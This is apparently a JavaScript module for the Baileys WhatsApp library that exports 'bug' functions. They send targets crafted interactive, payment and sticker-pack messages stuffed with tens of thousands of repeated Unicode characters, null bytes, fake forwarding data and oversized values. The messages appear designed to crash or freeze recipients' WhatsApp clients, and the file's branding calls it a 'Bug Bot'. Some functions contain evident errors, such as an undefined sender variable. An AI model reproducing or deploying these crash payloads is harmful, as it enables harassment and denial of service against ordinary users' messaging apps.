const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
const thumb = "https://files.catbox.moe/3p0udg.jpg";

async function BuggsGb(sock, target) {
sock.relayMessage(target, {
   interactiveMessage: {
    body: { text: "How Are You?" },
     nativeFlowMessage: {
      buttons: [
        {
          name: "catalog_message",
          buttonParamsJson: "{}"
        }
      ],
     messageParamsJson: "{}"
    }
  }
}, {
   additionalNodes: [
    {
      tag: "biz",
      attrs: {
        native_flow_name: "catalog_message"
       }
     }
   ]
 });
}

async function BuggsGb2(sock, target) {
 await sock.relayMessage(from, {
  senderKeyDistributionMessage: {
    groupId: "7205-1234@g.us",
    axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
  },
  interactiveMessage: {
    body: { text: "𖣂︎ 𝑵𝒕𝒆𝒅𝐄𝐱𝐞𝐜 𖣂︎" },
    nativeFlowMessage: {
      buttons: [
        {
          name: "catalog_message",
          buttonParamsJson: "{}"
        }
      ],
      messageParamsJson: "{}"
    }
  }
}, {
  additionalNodes: [
    {
      tag: "biz",
      attrs: {
        native_flow_name: "catalog_message"
      }
    }
  ]
 });
}
async function ZazaMethod(sock, target) {
await sock.relayMessage(target, {
  interactiveMessage: {
   body: { text: ".! 𖣂︎ Nted • Wazap 𖣂︎ !." },
    nativeFlowMessage: {
     buttons: [
       {
         name: "review_and_pay",
         buttonParamsJson: `{"reference_id":"${"𑇂".repeat(50000)}","currency":"IDR","total_amount":{"value":150000,"offset":100},"order":{"status":"pending","subtotal":{"value":120000,"offset":100},"tax":{"value":30000,"offset":100},"items":[{"name":"${"\0".repeat(9000)}","amount":{"value":12000000,"offset":100},"quantity":1000}]}}`
       }
     ], 
      messageParamsJson: JSON.stringify({
       limited_time_offer: {
        text: "Wazap",
        url: "https://t.me/TceSupportID",
        copy_code: "N | Bug Bot",
        expiration_time: Date.now() * 10000
        },
        tap_target_configuration: {
         title: "Nted WazapBOT",
         description: "./NtedBitch",
         canonical_url: "https://t.me/NtedBitch",
         domain: "https://t.me/NtedBitch",
         button_index: 0
        },
      })
    }
  }
}, {})
}

async function StcX(sock, target) {
 await sock.relayMessage(sock, {
   stickerPackMessage: {
    stickerPackId: "d06d5803-232d-4f27-97ab-6e1a56b98434",
    name: "\0" + "𑇂𑆵𑆴𑆿".repeat(60000),
    publisher:"",
    stickers: [
     {
      fileName: "vrPf0XE09N6FFSxWWNi44Cs6I26fGbgXqFzRRcL3E-M=.webp",
      isAnimated: false,
      emojis: ["☕ 🙂"],
      accessibilityLabel: "A smiling, white cup contains a brown drink.",
      isLottie:false,
      mimetype:"image/webp"
     },
    {
     fileName: "VTzLXxPyAt2kj1htM6q5mS1bNkdeOoq05gXN4bHRedI=.webp",
     isAnimated: false,
     emojis: ["😄 😀"],
     accessibilityLabel: "A laughing, white cup is tilted to the right and contains a brown drink.",
     isLottie: false,
     mimetype:"image/webp"
    },
  ],
  fileLength: "44284",
  fileSha256: "x5U7VwPORg55pOOkbcT5WluOTupd08MqQWhLJOSF1/0=",
  fileEncSha256: "HK/DWi8Hit2AH/zdl+zF+iOtOqn7sblWzv2idv/e2Fk=",
  mediaKey: "yAY8sMN8WBF4bll0iXI6qIpeMSdnUAouZmXQ9K6bBH8=",
  directPath: "/v/t62.15575-24/568790455_1348223060743345_7265249758547324723_n.enc?ccb=11-4&oh=01_Q5Aa4wEgp_5d1tX1I0lhoiARqwVzqsIDuTa6MzE_herbdRmA5A&oe=6A6EF01A&_nc_sid=5e03e0",
  contextInfo:{
    isForwarded: true, 
    forwardingScore: 250208,
    businessMessageForwardInfo: {
      businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    },
    mediaKeyTimestamp: "1783073744",
     trayIconFileName: "d06d5803-232d-4f27-97ab-6e1a56b98434.png",
      thumbnailDirectPath: "/v/t62.15575-24/738340804_998258556254669_2403531129898347266_n.enc?ccb=11-4&oh=01_Q5Aa4wEeUfeh0thOBv6PkpN8i1SzwKMg-XO8zXOVMuEysGPpUw&oe=6A6EF791&_nc_sid=5e03e0",
      thumbnailSha256: "cdIWH9M9fl0pRkOhFh3I+HyMYTxExUD14juPeDrVzR8=",
      thumbnailEncSha256: "T06Qnw57tBJJ6cuwtv/SNQQiCFoMEX+5yExOn+LtzDY=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "MjgxMzkwYzdlM2Q1MjdlM2ZkMDg3NjE4ZjViMTczMjFhNTM2ZDE1ODM1ZTA1NTVhNjM5MTYyNzkxNWVhOGZkMw==",
      stickerPackSize: "42788",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}
async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}

module.exports = {
  BuggsGb,
  BuggsGb2,
  ZazaMethod,
  StcX
};